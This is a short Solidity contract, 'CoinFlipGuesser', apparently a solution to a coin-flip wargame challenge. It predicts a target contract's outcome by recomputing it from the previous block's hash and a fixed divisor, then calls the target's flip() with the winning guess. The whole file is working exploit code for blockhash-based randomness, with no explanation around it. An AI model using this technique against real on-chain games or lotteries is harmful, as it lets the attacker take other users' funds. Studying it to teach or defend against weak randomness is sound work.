// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipGuesser {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function guess(ICoinFlip _icf) public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    return _icf.flip(coinFlip == 1);
  }
}

interface ICoinFlip{
    function flip(bool _guess) external;
}